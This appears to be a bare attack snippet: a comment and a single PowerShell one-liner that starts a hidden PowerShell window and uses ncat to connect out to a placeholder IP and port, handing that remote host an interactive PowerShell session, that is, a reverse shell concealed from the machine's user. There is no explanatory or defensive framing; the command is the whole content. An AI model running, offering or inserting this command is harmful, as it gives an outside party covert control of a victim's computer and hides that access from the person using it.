# run in a hidden powershell prompt 
powershell.exe -windowstyle hidden -Command { ncat.exe IP PORT -e powershell.exe}